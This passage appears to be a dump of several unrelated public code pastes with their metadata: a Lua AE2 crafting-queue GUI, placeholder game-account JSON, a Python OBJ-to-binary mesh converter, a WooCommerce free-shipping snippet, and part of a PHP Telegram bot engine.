        --log('get_craftable', inspect(craftables))
        if err then
            recipe.error = 'ae2.getCraftables ' .. tostring(err)
        elseif #craftables == 0 then
            recipe.error = 'No crafting pattern found'
        elseif #craftables == 1 then
            coroutine.yield(recipe, needed, craftables[1])
        else
            recipe.error = 'Multiple crafting patterns'
        end

        ::continue::
    end
end

function override(object, method, fn)
    local super = object[method] or function() end
    object[method] = function(...)
        fn(super, ...)
    end
end

function numberValidator(str)
    n = tonumber(str, 10)
    return n and math.floor(n) == n
end

-- Stay close to the 16 Minecraft colors in order to work on gold GPU/screen
local C_BACKGROUND = 0x3C3C3C
local C_STATUS_BAR = 0xC3C3C3
local C_STATUS_TEXT = 0x1E1E1E
local C_STATUS_PRESSED = 0xFFFF00
local C_BADGE = 0xD2D2D2
local C_BADGE_ERR = 0xFF4900 --0xFFB6FF
local C_BADGE_BUSY = 0x336DFF
local C_BADGE_SELECTED = 0xFFAA00
local C_BADGE_TEXT = 0x1E1E1E
local C_INPUT = 0xFFFFFF
local C_INPUT_TEXT = 0x1E1E1E
local C_SCROLLBAR = C_BADGE_SELECTED
local C_SCROLLBAR_BACKGROUND = 0xFFFFFF

function buildGui()
    local app = GUI.application()
    local statusBar = app:addChild(GUI.container(1, 1, app.width, 1))
    local window = app:addChild(GUI.container(1, 1 + statusBar.height, app.width, app.height - statusBar.height))

    window:addChild(GUI.panel(1, 1, window.width, window.height, C_BACKGROUND))
    local columns = math.floor(window.width / 60) + 1

    -- Crating queue view
    local craftingQueueView = window:addChild(GUI.layout(1, 1, window.width-1, window.height, columns, 1))
    for i = 1, columns do
        craftingQueueView:setAlignment(i, 1, GUI.ALIGNMENT_HORIZONTAL_CENTER, GUI.ALIGNMENT_VERTICAL_TOP)
        craftingQueueView:setMargin(i, 1, .5, 1)
    end

    override(craftingQueueView, 'draw', function(super, self, ...)
        self.children = {}

        local added = 0
        for _, recipe in ipairs(recipes) do
            local color =
            recipe.error and C_BADGE_ERR or
                    recipe.crafting and C_BADGE_BUSY or
                    (recipe.stored or 0) < recipe.wanted and C_BADGE

            if color then
                local badge = GUI.container(1, 1, math.floor(self.width / columns - 1), 4)
                self:setPosition(1 + added % columns, 1, self:addChild(badge))
                badge:addChild(GUI.panel(1, 1, badge.width, 4, color))
                badge:addChild(GUI.text(2, 2, C_BADGE_TEXT, recipe.label)) -- TODO: include the item icon ?
                badge:addChild(GUI.text(2, 3, C_BADGE_TEXT, string.format('%s / %s', recipe.stored or '?', recipe.wanted)))
                if recipe.error then
                    badge:addChild(GUI.text(2, 4, C_BADGE_TEXT, tostring(recipe.error)))
                    badge:moveToFront()
                end

                added = added + 1
            end
        end

        super(self, ...)
    end)

    -- Configuration view
    local SYMBOL_CONFIG_RECIPE = {}
    local configView = window:addChild(GUI.container(1, 1, window.width, window.height))
    configView:addChild(GUI.panel(1, 1, configView.width, configView.height, C_BACKGROUND))
    configView.hidden = true

    -- left panel (item select)
    local itemListSearch = configView:addChild(GUI.input(2, 2, configView.width/2-1, 3,
            C_INPUT, C_INPUT_TEXT, C_INPUT_TEXT, C_STATUS_PRESSED, C_INPUT_TEXT, '', 'Search'))

    -- TODO: add unconfigured/hidden filter

    local itemListPanel = configView:addChild(GUI.list(
            itemListSearch.x, itemListSearch.y + itemListSearch.height + 1, itemListSearch.width, configView.height-itemListSearch.height-3,
            1, 0, C_BADGE, C_BADGE_TEXT, C_STATUS_BAR, C_STATUS_TEXT, C_BADGE_SELECTED, C_BADGE_TEXT
    ))
    itemListPanel.selectedItem = -1
    --itemListPanel:setAlignment(GUI.ALIGNMENT_HORIZONTAL_LEFT, GUI.ALIGNMENT_VERTICAL_TOP)
    attachScrollbar(itemListPanel)

    override(itemListPanel, 'draw', function (super, self, ...)
        self.selectedItem = -1
        self.children = {}

        local selection = recipes
        local filter = itemListSearch.text
        if filter and filter ~= '' then
            filter = unicode.lower(filter)
            selection = {}
            for _, recipe in ipairs(recipes) do
                -- Patterns seem very limited, no case-insensitive option
                if unicode.lower(recipe.label):find(filter) then
                    table.insert(selection, recipe)
                end
            end
        end

        self.scrollBar.maximumValue = math.max(0, #selection - self.height)
        self.scrollBar.shownValueCount =  self.scrollBar.maximumValue / (self.scrollBar.maximumValue + 1)

        local offset = self.scrollBar.value
        for i = 1, math.min(self.height, #selection) do
            local recipe = selection[offset + i]
            local choice = self:addItem(recipe.label)
            --choice.colors.default.background = (recipe.error ~= nil) and C_BADGE_ERR or recipe.wanted > 0 and C_BADGE_BUSY or C_BADGE
            if recipe == configView[SYMBOL_CONFIG_RECIPE] then
                self.selectedItem = i
            end
            choice.onTouch = function(app, object)
                configView[SYMBOL_CONFIG_RECIPE] = recipe
                event.push('config_recipe_change')
            end
        end

        super(self, ...)
    end)

    -- right panel (item details)
    local reloadBtn = configView:addChild(GUI.button(configView.width/2+2, 2, configView.width/2-2, 3,
                                                     C_BADGE, C_BADGE_TEXT, C_BADGE, C_STATUS_PRESSED, ""Reload recipes""))
    reloadBtn.onTouch = function(app, self)
        event.push('ae2_loop', 'reload_recipes')
    end
    local itemConfigPanel = configView:addChild(GUI.layout(reloadBtn.x, reloadBtn.y + reloadBtn.height + 1, reloadBtn.width, configView.height-reloadBtn.height-7, 1, 1))
    configView:addChild(GUI.panel(itemConfigPanel.x, itemConfigPanel.y, itemConfigPanel.width, itemConfigPanel.height, C_BADGE)):moveBackward()
    itemConfigPanel:setAlignment(1, 1, GUI.ALIGNMENT_HORIZONTAL_CENTER, GUI.ALIGNMENT_VERTICAL_TOP)
    itemConfigPanel:setMargin(1, 1, .5, 1)

    override(itemConfigPanel, 'eventHandler', function(super, app, self, key, ...)
        if key == ""config_recipe_change"" then
            local recipe = configView[SYMBOL_CONFIG_RECIPE]

            self.children = {}
            self:addChild(GUI.text(1, 1, C_BADGE_TEXT, '[ '..recipe.label..' ]'))
            self:addChild(GUI.text(1, 1, C_BADGE_TEXT, ""Stored: ""..tostring(recipe.stored)))
            self:addChild(GUI.text(1, 1, C_BADGE_TEXT, ""Wanted""))
            local wantedInput = self:addChild(GUI.input(1, 1, 10, 3,
                    C_INPUT, C_INPUT_TEXT, 0, C_STATUS_PRESSED, C_INPUT_TEXT, tostring(recipe.wanted)))
            wantedInput.validator = numberValidator
            wantedInput.onInputFinished = function(app, object)
                recipe.wanted = tonumber(object.text) or error('cannot parse '..object.text)
                event.push('ae2_loop')
                event.push('save')
            end

            -- TODO: add remove/hide option

            -- self:draw()
            event.push('redraw') -- There is probably a more elegant way to do it ¯\_(ツ)_/¯
        end
        super(app, self, key, ...)
    end)

    local resetRecipeBtn = configView:addChild(GUI.button(itemConfigPanel.x, itemConfigPanel.y + itemConfigPanel.height + 1, itemConfigPanel.width, 3,
                                                          C_BADGE, C_BADGE_TEXT, C_BADGE, C_STATUS_PRESSED, ""Reset""))
    resetRecipeBtn.onTouch = function(app, self)
        local recipe = configView[SYMBOL_CONFIG_RECIPE]
        if not recipe then return end
        for i, candidate in ipairs(recipes) do
            if (candidate == recipe) then
                table.remove(recipes, i)
                return
            end
        end
    end

    -- Status bar
    statusBar:addChild(GUI.panel(1, 1, statusBar.width, statusBar.height, C_STATUS_BAR))
    local statusText = statusBar:addChild(GUI.text(2, 1, C_STATUS_TEXT, ''))
    statusText.eventHandler = function(app, self)
        self.text = string.format('CPU: %d free / %d total   Recipes:  %d errors  %d ongoing  %d queued   Update: %.0f ms',
            status.cpu.free, status.cpu.all, status.recipes.error, status.recipes.crafting, status.recipes.queue, status.update.duration * 1000)
    end
    statusText.eventHandler(app, statusText)
    local cfgBtn = statusBar:addChild(GUI.button(statusBar.width - 14, 1, 8, 1, C_STATUS_BAR, C_STATUS_TEXT, C_STATUS_BAR, C_STATUS_PRESSED, '[Config]'))
    cfgBtn.switchMode = true
    cfgBtn.animationDuration = .1
    cfgBtn.onTouch = function(app, object)
        configView.hidden = not object.pressed
    end
    statusBar:addChild(GUI.button(statusBar.width - 6, 1, 8, 1, C_STATUS_BAR, C_STATUS_TEXT, C_STATUS_BAR, C_STATUS_PRESSED, '[Exit]')).onTouch = function(app, object)
        event.push('exit')
    end

    return app
end

function attachScrollbar(obj)
    local width = (obj.width > 60) and 2 or 1
    obj.width = obj.width - width
    local bar = GUI.scrollBar(obj.x+obj.width, obj.y, width, obj.height, C_SCROLLBAR_BACKGROUND, C_SCROLLBAR,
            0, 1, 0, 1, 4, false)
    obj.parent:addChild(bar)
    obj.scrollBar = bar

    override(obj, 'eventHandler', function (super, app, self, key, ...)
        if key == 'scroll' then -- forward scrolls on the main object to the scrollbar
            bar.eventHandler(app, bar, key, ...)
        end
        super(app, self, key, ...)
    end)

    return bar
end

-- Start the program
main()"
Bn7Xts1j,Untitled,Bosta_adm,JSON,Wednesday 28th of June 2023 03:22:59 PM CDT,"
STK1 = {
      ""ID"" : ""1"",
      ""Username"" : ""StkMods"",
      ""Uid"" : ""Xs-982Jb982"",
      ""Password"" : ""123"",
      ""Dinheiro"" : ""100"",
      ""Estilo"" : ""R$""
}
STK2 = { 
      ""ID"" : ""2"",
      ""Username"" : ""StkMods1"",
      ""Uid"" : ""Xs-982882"",
      ""Password"" : ""123"",
      ""Dinheiro"" : ""100"",
      ""Estilo"" : ""R$""
}
STK3 = {
      ""ID"" : ""3"",
      ""Username"" : ""StkMods2"",
      ""Uid"" : ""Xs-982LHGBb982"",
      ""Password"" : ""123"",
      ""Dinheiro"" : ""100"",
      ""Estilo"" : ""R$""
}
STK4 = {
      ""ID"" : ""4"",
      ""Username"" : ""StkMods3"",
      ""Uid"" : ""Xs-98200082"",
      ""Password"" : ""123"",
      ""Dinheiro"" : ""100"",
      ""Estilo"" : ""R$""
}
STK5 = {
      ""ID"" : ""5"",
      ""Username"" : ""StkMods4"",
      ""Uid"" : ""Xs-982POURDN9982"",
      ""Password"" : ""123"",
      ""Dinheiro"" : ""100"",
      ""Estilo"" : ""R$""
}
"
dhufw68d,primitive version of my proprietary 3d format,Kitomas,Python,Wednesday 28th of June 2023 03:09:59 PM CDT,"from sys import argv
from struct import pack
from math import ceil,log
if len(argv) < 2: print(""no file name given!""); exit()
vertices,faces=[],[]; byteBuff=b''; lineNum=1; amountMax=0
fileI=open(argv[1],""r"")
for l in fileI:
    line=l[:-1].split("" "")
    if line[0] == ""v"":
        byteBuff=b''
        for v in range(1,len(line)): byteBuff+=pack(""f"", float(line[v]))
        vertices.append(byteBuff)
    elif line[0] == ""f"":
        faces.append([]); last=len(faces)-1
        for index in range(1,len(line)): faces[last].append( int(line[index].split(""/"")[0])-1 )
        if len(faces[last]) != 3: print((""line {}: face is not a triangle"").format(lineNum)); exit()
    lineNum+=1
fileI.close(); fileO=open(argv[1].split(""."")[0]+"".rtr"",""wb"")
for face in faces: amountMax=max(amountMax or 0,face[0],face[1],face[2])
bc=ceil(log(amountMax,2)/8)
fileO.write(bc.to_bytes(1,""little"")+len(vertices).to_bytes(4,""little"")+len(faces).to_bytes(4,""little""))
for vertex in vertices: fileO.write(vertex)
for face in faces: fileO.write(face[0].to_bytes(bc,""little"")+face[1].to_bytes(bc,""little"")+face[2].to_bytes(bc,""little""))
fileO.close()"
1qgFQVUt,Nastavení dopravy zdarma pro všechny dopravy od určité výše,Fany_VanDaal,PHP,Wednesday 28th of June 2023 02:38:32 PM CDT,"// Nastavení dopravy zdarma pomocí kupónu
add_filter( 'woocommerce_package_rates', 'wpsh_free_shipping_coupon', 20, 2 );
function wpsh_free_shipping_coupon( $rates, $package ) {
    $has_free_shipping = false;

    $applied_coupons = WC()->cart->get_applied_coupons();
    foreach( $applied_coupons as $coupon_code ){
        $coupon = new WC_Coupon($coupon_code);
        if($coupon->get_free_shipping()){
            $has_free_shipping = true;
            break;
        }
    }

    foreach( $rates as $rate_key => $rate ){
        if( $has_free_shipping ){
            // Pokud je povolena doprava zdarma, tak ji skryjeme
            if( $rate->method_id == 'free_shipping'){
                unset($rates[$rate_key]);
            }
            // Pro ostatní dopravy nastavíme
            else {
                // Místt cen yzobrazíme ZDARMA
                $rates[$rate_key]->label .= ' ' . __('(ZDARMA)', 'woocommerce');

                // Cena dopravy bude
                $rates[$rate_key]->cost = 0;

                // Nastavíme daň pro dopravu
                $taxes = array();
                foreach ($rates[$rate_key]->taxes as $key => $tax){
                    if( $rates[$rate_key]->taxes[$key] > 0 )
                        $taxes[$key] = 0;
                }
                $rates[$rate_key]->taxes = $taxes;
            }
        }
    }
    return $rates;
}

// Automaticky aplikujeme kupón pro dopravu zdarma
add_action( 'woocommerce_before_cart' , 'add_coupon_notice' );
add_action( 'woocommerce_before_checkout_form' , 'add_coupon_notice' );

function add_coupon_notice() {

        $cart_total = WC()->cart->get_subtotal();
        $minimum_amount = 1100; // Nastav jaká je minimální výše v košíku, kdy je doprava zdarma
        $currency_code = get_woocommerce_currency();
        wc_clear_notices();

       if ( $cart_total < $minimum_amount ) {
              WC()->cart->remove_coupon( 'doprava' ); // zadej kód pro dopravu zdarma.
              wc_print_notice( ""Získejte dopravu ZDARMA pokud nakupíte za více než $minimum_amount Kč"", 'notice' );
        } else {
              WC()->cart->apply_coupon( 'doprava' );
              wc_print_notice( 'Právě jsme Vám dali dopravu ZDARMA!', 'notice' );
        }        
          wc_clear_notices();
}"
VxL79y2w,main.php,radik098,PHP,Wednesday 28th of June 2023 01:46:41 PM CDT,"<?php
    /*
        Uk. Soft - Evolution (c)
        BotEngine
        v. 1. 0
    */
    namespace UkSoftEvolution\BotEngine;

    // Подключаем ядро
    include ""core.php"";

    // Используем зависимости
    use mysqli;
    use UkSoftEvolution\BotEngine\Core;
    use UkSoftEvolution\BotEngine\Core\BotInfo;
    use UkSoftEvolution\BotEngine\Core\Menu;
    use UkSoftEvolution\BotEngine\Core\Button;
    use UkSoftEvolution\BotEngine\Core\DB;
    use UkSoftEvolution\BotEngine\Core\DAL;
    use UkSoftEvolution\BotEngine\Core\Log;
    use UkSoftEvolution\BotEngine\Core\Telegram;
    use UkSoftEvolution\BotEngine\Core\Telegram\Model\Message;
    use UkSoftEvolution\BotEngine\Core\Telegram\Model\InlineQuery;
    use UkSoftEvolution\BotEngine\Core\Telegram\Model\PreCheckoutQuery;
    use UkSoftEvolution\BotEngine\Core\Telegram\Model\Response as TGResponse;

    /**
     * # BotEngine
     * ##### By Uk. Soft - Evolution
     * @property mysqli $DB База данных
     * @property array $DBData Данные для подключения к БД
     * @property string $BotName Имя бота
     * @property string $BotToken Токен бота
     * @property Message|null $Message Сообщение
     * @property array $MenuList Список меню
     * @property string $RootMenu Коренное меню
     * @property Telegram $Telegram Telegram API
     * @property string $Nav Навигация
     * @property int $OldMgroup ID старой медиагруппы
     * @property int $NewMgroup ID новой медиагруппы
     * @property InlineQuery|null $InlineQuery Инлайновый запрос
     * @property bool $isInline Является ли полученный хук инлайновым запосом
     * @property PreCheckoutQuery|null $PreCheckoutQuery Запрос на подтверждение оплаты
     * @property bool $isPreCheckout Являеться ли полученный хук запросом на подтверждение оплаты
     * @property Log $Log Модуль логов
     * @property callable $InlineQueryAction Экшн события обработки инлайнового запроса
	 * @property bool $AllowGroups Разрешать ли сообщения из групповых чатов
     */
    class Engine
    {
        public mysqli $DB;
        public array $DBData;
        public string $BotName;
        public string $BotToken;
        public ?Message $Message;
        public array $MenuList = [];
        public string $RootMenu;
        public Telegram $Telegram;
        public string $Nav;
        public int $OldMgroup = 0;
        public int $NewMgroup = 0;
        public ?InlineQuery $InlineQuery;
        public bool $isInline = false;
        public ?PreCheckoutQuery $PreCheckoutQuery;
        public bool $isPreCheckout;
        public Log $Log;
        public $InlineQueryAction;
        public $PreCheckoutQueryAction;
        public $Keyboard = ""Remove"";
        public string $Admin = """";
        public bool $AllowGroups = false;

        /**
         * Конструктор класса
         * @param BotInfo $info Конфиг бота
         */
        function __construct(BotInfo $info)
        {
            // Подключаемся к БД
            $this->DB = DB::Connect($info->DB);

            // В отдельную переменную заносим данные подключения к БД
            $this->DBdata = $info->DB;

            // Получаем и запоминаем основные сведения о боте
            $this->BotName = $info->Name;
            $this->BotToken = $info->Token;

            $this->Admin = $info->Admin;

            // Инициализируем класс для работы с Telegram
            $this->Telegram = new Telegram($info->Token, $info->ButtonsAutoSize);

            $this->AllowGroups = $info->AllowGroups;

            $this->InlineQuery = $this->Telegram->GetInlineQuery();
            $this->PreCheckoutQuery = $this->Telegram->GetPreCheckoutQuery();
            
            $this->isInline = $this->InlineQuery != false;
            $this->isPreCheckout = $this->PreCheckoutQuery != false;

            if(!$this->isInline && !$this->isPreCheckout) {
                $this->Message = $this->Telegram->GetUserMessage();

                // Отладка
                $this->Log = new Log($this->Message->uID, $this->DB);
    
                if($this->Message->isGroup && !$this->AllowGroups) {
                    exit();
                }
                if($this->Message->Text == ""/getid"") {
                    $this->Log->RequestSuccess();
                    $this->Send(""Your ID: "" . $this->Message->uID);
                    exit();
                }
    
                if($info->Private && !in_array($this->Message->uID, $info->PrivateAllow)) {
                    $this->Log->RequestFail(403, ""User not allowed.\nID: "" . $this->Message->uID);
                    $this->Send(""🚫 Доступ к данному боту ограничен."");
                    exit();
                }
    
                if($this->Message->MessageID == -1 && !$this->isInline) {
                    // Отображаем юзеру, что бот что-то пишет
                    $this->StatusTyping();
                }
    
                // Получаем и запоминаем последнюю медиагруппу
                $this->OldMgroup = DAL::GetLastMediaGroup($this->Message->uID, $this->DB);
                
                // Если сообщение принадлежит к медиагруппе, то сохраняем её и запоминаем в БД
                if($this->Message->isMediaGroup) {
                    $this->NewMgroup = $this->Message->mgroupID;
                    DAL::SetLastMediaGroup($this->Message->mgroupID, $this->Message->uID, $this->DB);
                }
    
                // Регистрируем Telegram юзера в БД (если он не зарегистрирован)
                DAL::RegisterUserIfNotExists($this->Message->uID, $this->Message->username, $this->Message->userFull, $this->DB);
            } else if($this->isInline) {
                 // Отладка
                 $this->Log = new Log($this->InlineQuery->uID, $this->DB);

                 $this->Message = new Telegram\Model\Message([
                     ""uID"" => $this->InlineQuery->uID
                 ]);
            } else if($this->isPreCheckout) {
                // Отладка
                $this->Log = new Log($this->PreCheckoutQuery->uID, $this->DB);

                $this->Message = new Telegram\Model\Message([
                    ""uID"" => $this->PreCheckoutQuery->uID
                ]);
            }
        }

        /**
         * Резервная функция для инициализации БД
         * @return mysqli БД
         */
        public function DB() : ?mysqli
        {
            return DB::Connect($this->DBdata);
        }

        /**
         * Функция для проверки наличия новой медиагруппы
         * @return bool Результат проверки
         */
        public function HasNewMediaGroup() : bool
        {
            return ($this->OldMgroup != $this->NewMgroup) && $this->OldMgroup != 0 && $this->NewMgroup != 0;
        }

        /**
         * Метод для создания меню
         * @param array Массив данных
         * @return string Имя меню
         */
        public function CreateMenu(array $data) : string
        {
            if(!isset($data['OnPay'])) {
                $data['OnPay'] = function(Message $Message, Engine $Engine)
                {
                    $Engine->Send(""Оплата пришла.. Но увы вы находитесь в меню в котором нет обработчика события оплаты.😢\nОбратитесь сюда за помощью - "" . $Engine->Admin);
                };
            }
            $this->MenuList[] = new Menu($data);
            return $data['Name'];
        }

        /**
         * Метод для задания корневого меню
         * @param string $menu Навигационное название меню
         */
        public function SetRootMenu(string $menu)
        {
            $this->RootMenu = $menu;
        }

        /**
         * Метод для отправки сообщения
         * @param string $Text текст сообщения
         * @param bool $RemoveLastKeyboard флаг удаления последней клавиатуры
         * @param array $MainKeyboard Массив кнопок основной клавиатуры
         * @param array $InlineKeyboard Массив кнопок инлайновой клавиатуры
         * @param string $Channel ID канала (необязательно)
         * @param string $ParseMode Метод парсинга
         * @return TGResponse Результат операции
         */
        public function Send(string $Text, bool $RemoveLastKeyboard = false, $MainKeyboard = [], $InlineKeyboard = [], string $Channel = """", string $ParseMode = ""markdown"") : TGResponse
        {
            if(empty($Channel)) {
                if(!empty($MainKeyboard)) $this->Keyboard = $MainKeyboard;

                if($RemoveLastKeyboard && empty($this->Keyboard)) {
                    $MainKeyboard = ""Remove"";
                } else {
                    $MainKeyboard = $this->Keyboard;
                }
                if(!empty($InlineKeyboard)) {
                    $MainKeyboard = [];
                }

                $Response = $this->Telegram->SendMessage($Text, $this->Message->uID, $MainKeyboard, $InlineKeyboard, $ParseMode);
            } else {
                if(empty($InlineKeyboard)) $InlineKeyboard = null;
                $Response = $this->Telegram->SendMessage($Text, $Channel, null, $InlineKeyboard, $ParseMode);
            }

            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                if(!empty($Response)) {
                    $this->Log->ResponseFail($Response->code, $Response->error);
                } else {
                    $this->Log->ResponseFail(500, ""Empty result"");
                }
                
            }
            return $Response;
        }

        /**
         * Метод для отправки фотографии
         * @param string $Photo Картинка
         * @param string $Text Текст
         * @param bool $RemoveLastKeyboard Флаг удаления последней клавиатуры
         * @param array $MainKeyboard Основная клавиатура
         * @param array $InlineKeyboard Инлайновая клавиатура
         * @return TGResponse Результат операции
         */
        public function SendPhoto(string $Photo, string $Text = """", bool $RemoveLastKeyboard = false, ?array $MainKeyboard = [], string $Channel = """", ?array $InlineKeyboard = []) : TGResponse
        {
            if(empty($Channel)) {
                if(!empty($MainKeyboard)) $this->Keyboard = $MainKeyboard;
                if($RemoveLastKeyboard && empty($this->Keyboard)) {
                    $MainKeyboard = ""Remove"";
                } else {
                    $MainKeyboard = $this->Keyboard;
                }
                if(empty($InlineKeyboard)) {
                    $Response = $this->Telegram->SendPhoto($Photo, $this->Message->uID, $Text, $MainKeyboard, []);
                } else {
                    $Response = $this->Telegram->SendPhoto($Photo, $this->Message->uID, $Text, null, $InlineKeyboard);
                }
                
            } else {
                $Response = $this->Telegram->SendPhoto($Photo, $Channel);
            }
            
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для отправки видео
         * @param string $Video Видео
         * @param string $Text Текст
         * @param bool $RemoveLastKeyboard Флаг удаления последней клавиатуры
         * @param array $MainKeyboard Основная клавиатура
         * @param array $InlineKeyboard Инлайновая клавиатура
         * @return TGResponse Результат операции
         */
        public function SendVideo(string $Video, string $Text = """", bool $RemoveLastKeyboard = false, ?array $MainKeyboard = [], string $Channel = """", ?array $InlineKeyboard = []) : TGResponse
        {
            if(empty($Channel)) {
                if(!empty($MainKeyboard)) $this->Keyboard = $MainKeyboard;
                if($RemoveLastKeyboard && empty($this->Keyboard)) {
                    $MainKeyboard = ""Remove"";
                } else {
                    $MainKeyboard = $this->Keyboard;
                }
                if(empty($InlineKeyboard)) {
                    $Response = $this->Telegram->SendVideo($Video, $this->Message->uID, $Text, $MainKeyboard, []);
                } else {
                    $Response = $this->Telegram->SendVideo($Video, $this->Message->uID, $Text, null, $InlineKeyboard);
                }
                
            } else {
                $Response = $this->Telegram->SendVideo($Video, $Channel);
            }
            
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Альтернативный метод для отправки фотографии
         * @param string $Photo Картинка
         * @param string $Text Текст
         * @param bool $RemoveLastKeyboard Флаг удаления последней клавиатуры
         * @param array $MainKeyboard Основная клавиатура
         * @param array $InlineKeyboard Инлайновая клавиатура
         * @return TGResponse Результат операции
         */
        public function SendPhotoAlt(string $Photo, string $Text = """", bool $RemoveLastKeyboard = false, ?array $MainKeyboard = [], string $Channel = """", ?array $InlineKeyboard = []) : TGResponse
        {
            if(empty($Channel)) {
                if(!empty($MainKeyboard)) $this->Keyboard = $MainKeyboard;
                if($RemoveLastKeyboard && empty($this->Keyboard)) {
                    $MainKeyboard = ""Remove"";
                } else {
                    $MainKeyboard = $this->Keyboard;
                }
                if(empty($InlineKeyboard)) {
                    $Response = $this->Telegram->SendPhotoAlt($Photo, $this->Message->uID, $Text, $MainKeyboard, []);
                } else {
                    $Response = $this->Telegram->SendPhotoAlt($Photo, $this->Message->uID, $Text, null, $InlineKeyboard);
                }
                
            } else {
                $Response = $this->Telegram->SendPhotoAlt($Photo, $Channel);
            }
            
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для отправки документа
         * @param string $document Документ
         * @return TGResponse Результат операции
         */
        public function SendDocument(string $document) : TGResponse
        {
            $Response = $this->Telegram->SendDocument($document, $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для отправки геолокации
         * @param $lat Широта
         * @param $long Долгота
         * @return TGResponse Результат операции
         */
        public function SendLocation(string $lat, string $long) : TGResponse
        {
            $Response = $this->Telegram->SendLocation($lat, $long, $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для пересылки сообщения
         * @param int $MessageID ID сообщения
         * @param string $ChatID ID чата
         * @return TGResponse Результат операции
         */
        public function ForwardMessage(int $MessageID, string $ChatID) : TGResponse
        {
            $Response = $this->Telegram->ForwardMessage($ChatID, $MessageID, $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для редактирования сообщения
         * @param string $MessageID ID сообщения
         * @param string $NewText Новый текст
         * @return TGResponse Результат операции
         */
        public function EditMessage(string $MessageID, string $NewText) : TGResponse
        {
            $Response = $this->Telegram->EditMessage($MessageID, $NewText, $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для редактирования инлайновых кнопок сообщения
         * @param int $MessageID ID сообщения
         * @param array $InlineKeyboard Инлайновая клавиатура
         * @return TGResponse Результат операции
         */
        public function EditMessageInlineButtons(int $MessageID, array $InlineKeyboard) : TGResponse
        {
            $Response = $this->Telegram->EditMessageInlineButtons($MessageID, $InlineKeyboard, $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для удаления сообщения
         * @param int $MessageID ID сообщения
         * @return TGResponse Результат операции
         */
        public function DeleteMessage(int $MessageID) : TGResponse
        {
            $Response = $this->Telegram->DeleteMessage($MessageID, $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для отображения статуса бота - ""печатает...""
         * @return TGResponse Результат операции
         */
        public function StatusTyping() : TGResponse
        {
            $Response = $this->Telegram->SendAction('typing', $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для отображения статуса бота - ""отправка фото""
         * @return TGResponse Результат операции
         */
        public function StatusSendPhoto() : TGResponse
        {
            $Response = $this->Telegram->SendAction('upload_photo', $this->Message->uID);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для скачивания файла с серверов Telegram
         * @param string $ID ID файла
         * @return string Имя конечного файла
         */
        public function GetFileFromID(string $ID) : string
        {
            return $this->Telegram->GetFile($this->Telegram->GetFilename($ID));
        }

        /**
         * Метод для получения пути к файлу на серверах Telegram
         * @param string $ID ID файла
         * @return string Путь к файлу на серверах Telegram
         */
        public function GetFilenameFromID(string $ID) : string
        {
            return $this->Telegram->GetFilename($ID);
        }

        /**
         * Метод для получения файла по пути с серверов Telegram
         * @param string $Path Путь к файлу
         * @return string Путь к загруженному файлу
         */
        public function GetFileFromPath(string $Path) : string
        {
            return $this->Telegram->GetFile($Path);
        }

        /**
         * Метод для получения BLOB файла с серверов Telegram
         * @param int $ID ID файла
         * @return string BLOB
         */
        public function GetBlobFromID(int $ID) : string
        {
            return $this->Telegram->GetBlob($this->Telegram->GetFilename($ID));
        }

        /**
         * Метод для отправки группы фотографий
         * @param array $Photos Фотографии
         * @param string $Caption Подпись
         * @param string $Channel ID канала
         * @param bool $isID Является ли фото ID
         * @param string $ParseMode Метод парсинга
         * @return TGResponse Результат операции
         */
        public function SendPhotoGroup(array $Photos, string $Caption = """", string $Channel = """", bool $isID = false, string $ParseMode = ""markdown"") : TGResponse
        {
            if(empty($Channel)) {
                $Channel = $this->Message->uID;
            }
            $Response = $this->Telegram->SendPhotoGroup($Photos, $Channel, $Caption, $isID, $ParseMode);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для отправки медиагруппы
         * @param array $Content Контент
         * @param string $Caption Подпись
         * @param string $Channel ID канала
         * @param string $ParseMode Метод парсинга
         * @return TGResponse Результат операции
         */
        public function SendMediaGroup(array $Content, string $Caption = """", string $Channel = """", string $ParseMode = ""markdown"") : TGResponse
        {
            if(empty($Channel)) {
                $Channel = $this->Message->uID;
            }
            $Response = $this->Telegram->SendMediaGroup($Content, $Channel, $Caption, $ParseMode);
            if($Response->ok) {
                $this->Log->ResponseSuccess();
            } else {
                $this->Log->ResponseFail($Response->code, $Response->error);
            }
            return $Response;
        }

        /**
         * Метод для получения объекта меню по имени
         * @param string $name Имя меню
         * @return Menu Меню
         */
        private function GetMenuByName(string $Name) : ?Menu
        {
            foreach($this->MenuList as $Item) if($Item->Name == $Name) return $Item;
            if(empty($Name)) {
                foreach($this->MenuList as $Item) if($Item->Name == $this->RootMenu) return $Item;
            }
            return null;
        }

        /**
